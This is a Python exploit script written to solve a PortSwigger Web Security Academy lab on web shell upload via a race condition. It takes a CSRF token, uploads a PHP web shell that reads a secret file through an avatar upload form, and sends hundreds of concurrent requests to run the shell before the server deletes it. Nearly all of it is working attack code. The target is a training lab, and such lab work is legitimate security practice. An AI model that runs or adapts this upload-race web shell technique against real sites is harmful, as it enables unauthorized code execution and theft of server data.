#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse

from bs4 import BeautifulSoup

RACE_REQUEST_COUNT = 500
RACE_CONCURRENCY = 50

PHP_PAYLOAD = """<?php echo file_get_contents('/home/carlos/secret'); ?>"""


async def get_csrf_token(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
) -> str:
    """Fetch the CSRF token from the My Account page."""
    headers = {"Cookie": f"session={session}"}
    async with client.get(url + "/my-account", headers=headers, ssl=False) as res:
        text = await res.text()
        soup = BeautifulSoup(text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})
        if csrf_input and csrf_input.get("value"):
            return csrf_input["value"]
        raise ValueError("Could not find CSRF token on /my-account page")


async def upload_shell(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    csrf: str,
) -> str:
    """Upload the PHP web shell via the avatar upload form."""
    data = aiohttp.FormData()
    data.add_field(
        "avatar",
        PHP_PAYLOAD,
        filename="exploit.php",
        content_type="application/x-php",
    )
    data.add_field("user", "wiener")
    data.add_field("csrf", csrf)

    headers = {"Cookie": f"session={session}"}
    async with client.post(
        url + "/my-account/avatar",
        headers=headers,
        data=data,
        ssl=False,
    ) as res:
        body = await res.read()
        text = body.decode("utf-8", errors="replace")
        if res.status == 200:
            print("[*] Shell uploaded successfully")
            return text
        else:
            print(f"[-] Upload failed with status {res.status}")
            return ""


async def race_fetch(
    client: aiohttp.ClientSession,
    target_url: str,
    session: str,
) -> str | None:
    """Attempt to fetch the uploaded shell before it is deleted."""
    headers = {"Cookie": f"session={session}"}
    try:
        async with client.get(target_url, headers=headers, ssl=False) as res:
            if res.status == 200:
                body = await res.read()
                text = body.decode("utf-8", errors="replace")
                if text and len(text) > 0:
                    return text
    except (aiohttp.ClientError, asyncio.TimeoutError):
        pass
    return None


async def race_shell(
    client: aiohttp.ClientSession,
    target_url: str,
    session: str,
) -> str | None:
    """Race the deletion by sending many concurrent requests."""
    found = None

    async def attempt():
        nonlocal found
        if found:
            return
        result = await race_fetch(client, target_url, session)
        if result:
            found = result

    semaphore = asyncio.Semaphore(RACE_CONCURRENCY)

    async def bounded_attempt():
        async with semaphore:
            await attempt()

    tasks = [bounded_attempt() for _ in range(RACE_REQUEST_COUNT)]
    await asyncio.gather(*tasks)
    return found


async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Web shell upload via race condition"
    )
    parser.add_argument(
        "-u", "--url", type=str, required=True,
        help="URL of the PortSwigger lab (e.g. https://YOUR-LAB-ID.web-security-academy.net)",
    )
    parser.add_argument(
        "-s", "--session", type=str, required=True,
        help="Session cookie value",
    )

    args = parser.parse_args()
    url = args.url.rstrip("/")
    session = args.session.strip()

    target_url = url + "/files/avatars/exploit.php"

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 1: Get CSRF token
        print("[*] Fetching CSRF token...")
        try:
            csrf = await get_csrf_token(client, url, session)
            print(f"[+] CSRF token obtained")
        except ValueError as e:
            print(f"[-] {e}")
            return

        # Step 2: Start racing the shell URL while uploading
        print(f"[*] Starting race condition ({RACE_REQUEST_COUNT} requests)...")
        print(f"[*] Uploading shell and racing concurrently...")

        result = await asyncio.gather(
            upload_shell(client, url, session, csrf),
            race_shell(client, target_url, session),
        )

        secret = result[1]
        if secret:
            print(f"\n[+] Secret found: {secret}")
            print(f"[+] Submit this value to solve the lab.")
        else:
            print("[-] Could not retrieve the secret. Try increasing RACE_REQUEST_COUNT.")


if __name__ == "__main__":
    asyncio.run(main())
